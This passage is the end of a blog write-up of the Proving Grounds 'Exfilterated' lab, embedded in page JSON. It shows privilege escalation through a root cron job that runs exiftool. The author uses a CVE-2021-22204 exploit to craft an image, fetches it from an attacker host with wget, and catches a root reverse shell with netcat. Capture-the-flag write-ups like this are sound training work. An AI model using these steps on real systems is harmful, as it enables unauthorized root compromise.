\"jpg\" | while read filename; \r\ndo \r\n    exiftool \"$IMAGES/$filename\" >> $LOGFILE \r\ndone\r\n\r\necho -ne \"\\\\n\\\\n Processing is finished! \\\\n\\\\n\\\\n\"\r\nwww-data@exfiltrated:/opt$ \r\n</code></pre></div>\n<ol>\n<li>grep “jpg” isn’t secure enough, we can create jpg.sh</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">www-data@exfiltrated:/opt/metadata$ cat 19ffa20cf8\r\ncat 19ffa20cf8\r\nExifTool Version Number         : 11.88\r\nFile Name                       : jpg.sh\r\nDirectory                       : /var/www/html/subrion/uploads\r\nFile Size                       : 20 bytes\r\nFile Modification Date/Time     : 2024:09:07 19:12:25+00:00\r\nFile Access Date/Time           : 2024:09:07 19:12:25+00:00\r\nFile Inode Change Date/Time     : 2024:09:07 19:12:25+00:00\r\nFile Permissions                : rw-r--r--\r\nFile Type                       : sh script\r\nFile Type Extension             : sh\r\nMIME Type                       : text/x-sh\r\nwww-data@exfiltrated:/opt/metadata$ </code></pre></div>\n<p>Okay, we are almost there.\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/ea0a0d570fda7b078792b5507322265d/c8df6/8.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.958333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABsklEQVR42nWPzUvcQBjG849UVBQRK95EiwothXpQ2kKpUloRRKQflx489NBDb9765xW1Wt3dZPO1k2wmM5vN1+M7k2wIVSc8ed95eOc3zxjP3nzB6u5nTK3t4cnaPqbWP2B64yNmNg8wu3WIuedHmH9xjIWXJ1h89RWL29+wtPMdT1+fYvntD6y8+4mV97+w+ukMG0e/YXQtB52eDdP20DFV9bXOr25xed3R+nvTo30Hfy7/4eK6i6tbE32Xoe+FsP1KqrdIRpqOIaWAWlJKlPTleYY4jmtPoCxKpGkKzrn2RjRXFAUeWob6CSEQBAEdLJpBQYcSQVDllXRNWUEZY0iSRM8o7x4wGfSR5TnG41TDCkpT6EQZsiyrvUrV3Jj8XO/L+qKyDpF4PRhiGEJSwoQSqSpjgZGgdHKkn6b6trTf7EVLdJ5Yhue66FsWPMeB7zoImQ8eMsTDAIIko/Bh8aqKidRsHMFwCWSZJhzbhu+5CAe+hoZsgChg4DQY1+K1/u8baDSEoQADAjHfQ9CC8TDQSRU0otr09X5S7wFveiZss4sRxZV82Ei0n9OSfMSfAO8ASkLZXd5JPZkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ea0a0d570fda7b078792b5507322265d/a59e9/8.webp 192w,\n/static/ea0a0d570fda7b078792b5507322265d/0ca9f/8.webp 384w,\n/static/ea0a0d570fda7b078792b5507322265d/dc9b9/8.webp 768w,\n/static/ea0a0d570fda7b078792b5507322265d/e2c2f/8.webp 1152w,\n/static/ea0a0d570fda7b078792b5507322265d/f3efb/8.webp 1536w,\n/static/ea0a0d570fda7b078792b5507322265d/1e484/8.webp 1778w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ea0a0d570fda7b078792b5507322265d/3b721/8.png 192w,\n/static/ea0a0d570fda7b078792b5507322265d/66595/8.png 384w,\n/static/ea0a0d570fda7b078792b5507322265d/fe486/8.png 768w,\n/static/ea0a0d570fda7b078792b5507322265d/d2d74/8.png 1152w,\n/static/ea0a0d570fda7b078792b5507322265d/e8464/8.png 1536w,\n/static/ea0a0d570fda7b078792b5507322265d/c8df6/8.png 1778w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ea0a0d570fda7b078792b5507322265d/fe486/8.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Let’s try this one.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">                                                                                                                                \r\n┌──(hosan㉿kali)-[~/pg/exfiltrated/CVE-2021-22204-exiftool]\r\n└─$ python exploit.py                      \r\n    1 image files updated\r\n                                                                                                                                \r\n┌──(hosan㉿kali)-[~/pg/exfiltrated/CVE-2021-22204-exiftool]\r\n└─$ ls\r\nREADME.md  configfile  exploit.djvu  exploit.py  image.jpg  image.jpg_original  lab  payload  payload.bzz\r\n</code></pre></div>\n<p>So I created this malicious image.jpg file, downloaded it, and moved to /uploads folder, and waited calmly:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">www-data@exfiltrated:/tmp$ wget http://192.168.45.224:8000/image.jpg\r\nwget http://192.168.45.224:8000/image.jpg\r\n--2024-09-07 19:23:54--  http://192.168.45.224:8000/image.jpg\r\nConnecting to 192.168.45.224:8000... connected.\r\nHTTP request sent, awaiting response... 200 OK\r\nLength: 47571 (46K) [image/jpeg]\r\nSaving to: 'image.jpg'\r\n\r\n     0K .......... .......... .......... .......... ......    100%  797K=0.06s\r\n\r\n2024-09-07 19:23:54 (797 KB/s) - 'image.jpg' saved [47571/47571]\r\n\r\nwww-data@exfiltrated:/tmp$ ls\r\nls\r\nimage.jpg\r\njpg.sh\r\nlinpeas.sh\r\npspy64\r\ntmux-33\r\nwww-data@exfiltrated:/tmp$ mv image.jpg /var/www/html/subrion/uploads/\r\nmv image.jpg /var/www/html/subrion/uploads/</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/exfiltrated/CVE-2021-22204-exiftool]\r\n└─$ nc -lvnp 8000        \r\nlistening on [any] 8000 ...\r\nconnect to [192.168.45.224] from (UNKNOWN) [192.168.157.163] 45380\r\n/bin/sh: 0: can't access tty; job control turned off\r\n# whoami\r\nroot\r\n# cat /root/proof.txt\r\n48fd81b4877866fad48bfa0b2987a3ef</code></pre></div>\n<p>That’s it!</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>Proving Grounds</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"Proving Grounds : Exfilterated","summary":"Solving Exfilterated machine from Proving Grounds","date":"2024.09.10.","before":"2024.09.06.","after":"2024.09.13.","categories":["C-SEC","proving_grounds","pentest","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC1ElEQVR42p2T204bVxSG55GqJjgEe3w22B4848PYYw82PoGMU5s0QMEoIRALQUl70RaUQisg6nvxAFWr9IIGbAP9umanva7ULf36196a9a/jaNVGl/riEu5CC7voUnJqCk6lgV1uUChWyeYr/wkrV1asIef+/p77uzvFDw8P/J/z1z9+2p0I/f7br1xdXfHhwx+MRmMFL8BkMmHisYfRiDvBaDLm+uaGP6+vGd3ecvPxI7dyvxV7PB6jtdrLNBptGs0l6o0lmh7X22z2e/x0MOT9yfdcnF9yef4LF8c/cHlyzOXpKRfC56c/c/bdCe92tnj/7pizH8/QHk895dHjaXy+GaaU/RTv7bPPfWSiUdZqFTa/2uX1y12+frnB4XDIwf4B+/tHvNk7ZNDf4HkqwXazxnD9BZoejBIMxQiF4kQiCfRgjKAHeZvxhwgEIpSKNXoVh0E1x9H2Om93d/hmb49vD9+y/eUWTjzJaqnATmcZzXOMRGaVWCT8r2hU2WEJMhMIMzPtxzUtNp71WK0UGbh5Xjdd9l+sMuj1MNIWlWSahi1TjsaSGEaWfN4RlCgWK4rT8lHWKpDL2kSiczzyBWi3uxwMj/iiVmMlk6Jv53jzrMuy2yBXqlFvddESswYZ06Zgyw6WqgoFETfms0o0Y3hsoutRnkzrbG6+orOySjpl4ph5HMvGkV1d7vRpSUAtljAwMgW1zOVKnYpEcxeakqlLTLIPBWOqDUE9pgTnkhnW1gfkC1KJvYBbbdPpPld+RspCi4tgKp0jK5tuFxdEeBGnvEhZYFlFlZkn6PXTs6d8fnGu0+utUa22VBssqdBImgpaLJ6WqHIx8phmUQnn8l4f5ZfKOipLJRqWYUmWgcCn0jsrfbak/IyRIz2XkexMJSxDSZGYzZBMZZmfL2CJiCdqZUvCjvTKUqvkrVU49Kl0v6ySX6afiKeIycB0PUJUOKBH+RsP+1oC9AIt2QAAAABJRU5ErkJggg=="},"images":{"fallback":{"src":"/static/100687a0435dc84798cb4768b9db3e23/480b7/1.png","srcSet":"/static/100687a0435dc84798cb4768b9db3e23/e70bd/1.png 335w,\n/static/100687a0435dc84798cb4768b9db3e23/02ead/1.png 670w,\n/static/100687a0435dc84798cb4768b9db3e23/480b7/1.png 1340w","sizes":"(min-width: 1340px) 1340px, 100vw"},"sources":[{"srcSet":"/static/100687a0435dc84798cb4768b9db3e23/b6eb7/1.webp 335w,\n/static/100687a0435dc84798cb4768b9db3e23/6a112/1.webp 670w,\n/static/100687a0435dc84798cb4768b9db3e23/fe2a7/1.webp 1340w","type":"image/webp","sizes":"(min-width: 1340px) 1340px, 100vw"}]},"width":1340,"height":880}},"publicURL":"/static/100687a0435dc84798cb4768b9db3e23/1.png"}}}}]}},"pageContext":{"slug":"/240910/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}